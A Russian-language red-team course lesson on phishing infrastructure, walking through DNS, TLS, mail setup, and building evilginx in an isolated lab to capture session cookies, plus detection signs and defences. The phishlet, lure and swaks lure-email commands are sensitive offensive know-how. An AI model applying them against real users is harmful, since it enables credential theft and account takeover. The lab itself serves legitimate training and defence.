# 13.1 — Фишинг-инфраструктура и evilginx

> **M13 · Этап 2 · 6 ч · 🔴 · артефакт:** `labs/m13-initial-access-c2/l01-phish/`

## Цель

Понять, из чего состоит фишинговая инфраструктура: домен, DNS, TLS, почта, прокси и landing page — и собрать её в изолированной лаборатории.

## Результат

- Схема инфраструктуры с разделением ролей.
- Рабочий phishing-proxy (evilginx) в лабе.
- Понимание, как детектится каждая часть.

## Теория

### 1. Компоненты

```text
Жертва → DNS → CDN/редиректор → phishing proxy → настоящий сайт
                              ↘ landing / capture
```

- **Домен** — должен выглядеть правдоподобно, но не нарушать чужие права.
- **DNS** — A/AAAA, TXT (SPF/DKIM/DMARC), CNAME.
- **TLS** — Let's Encrypt или внутренний CA для лабы.
- **Почта** — SMTP-релей, SPF/DKIM/DMARC, прогрев.
- **Landing** — клон страницы, форма, редирект.
- **Proxy** — evilginx/Modlishka: прокидывает реальный сайт и перехватывает сессию.

### 2. Evilginx

Reverse proxy, который стоит между жертвой и настоящим сайтом. Жертва видит настоящий домен в адресной строке (ваш домен), а трафик идёт к реальному сервису. Позволяет перехватить cookie/токены после аутентификации.

Ключевые понятия:

- **phishlet** — описание сайта: домены, куки, параметры.
- **lure** — ссылка с уникальным ID.
- **session** — перехваченная сессия.

### 3. Почтовые проверки

- **SPF** — кто может отправлять от имени домена.
- **DKIM** — подпись писем.
- **DMARC** — политика при провале SPF/DKIM (`none`, `quarantine`, `reject`).
- **MX/PTR** — репутация.

Для лаборатории достаточно локального SMTP (MailHog/Postfix) и тестового домена.

### 4. Детект

- Новый домен + TLS ≤ 30 дней.
- Похожесть на бренд (homoglyph, typo-squatting).
- Прокси-паттерны: несоответствие `Server`, `Set-Cookie`, `Origin`.
- Фишинг-киты: заголовки, путь `/phish/`, поведение.
- Почта: SPF fail, DMARC fail, странный `Return-Path`.
- EDR/прокси: переход на свежий домен, ввод creds, аномальный User-Agent.

## Лаборатория

> Изолированная сеть, локальный DNS `lab.local`, тестовый домен `training.lab`. Никаких реальных брендов и внешних сервисов.

### 1. DNS и TLS

```bash
# на LNX01 (DNS)
echo "10.10.10.60 phish.training.lab" >> /etc/hosts
# самоподписанный сертификат для лабы
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 \
  -subj "/CN=phish.training.lab"
```

Ожидаемо: сертификат и запись. В реальной операции — Let's Encrypt, но в лабе достаточно self-signed.

### 2. Landing

```bash
mkdir -p /srv/phish && cd /srv/phish
python3 -m http.server 8080
```

Создайте простую HTML-форму (логин/пароль) — только для теста. Ожидаемо: страница открывается по `http://10.10.10.60:8080`.

### 3. Evilginx (в отдельной ВМ)

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make
sudo ./evilginx -p ./phishlets
```

В консоли:

```text
config domain training.lab
config ip 10.10.10.60
phishlets hostname test training.lab
phishlets enable test
lures create test
lures get-url 0
```

Ожидаемо: lure-URL. Откройте в браузере лабораторной ВМ.

### 4. Перехват сессии

Пройдите логин на тестовом сервисе (например, локальный Nextcloud). Ожидаемо: в evilginx появится сессия с cookie.

### 5. Почта

```bash
# MailHog в Docker
docker run -d -p 1025:1025 -p 8025:8025 mailhog/mailhog
swaks --to victim@training.lab --from it@training.lab --server 10.10.10.60:1025 \
  --header "Subject: Password reset" --body "https://phish.training.lab/lure"
```

Ожидаемо: письмо в MailHog UI.

### 6. Разбор

Заполните таблицу:

| Компонент | Роль | Детект | Сложность |
|---|---|---|---|

## Атака и защита

- **Атака:** правдоподобный домен + proxy + письмо.
- **Детект:** new domain, TLS age, DMARC, прокси-аномалии, EDR-переходы.
- **Фикс:** MFA resistant (FIDO2), DMARC reject, обучение, блокировка новых доменов, Conditional Access.

## Самопроверка

- [ ] Зачем phishing proxy, если можно скопировать страницу?
- [ ] Что перехватывает evilginx?
- [ ] Чем SPF отличается от DMARC?
- [ ] Какие признаки выдают свежий домен?
- [ ] Почему FIDO2 ломает часть фишинга?

## Дальше

[13.2 — Payload delivery](l02-payload-delivery.md)
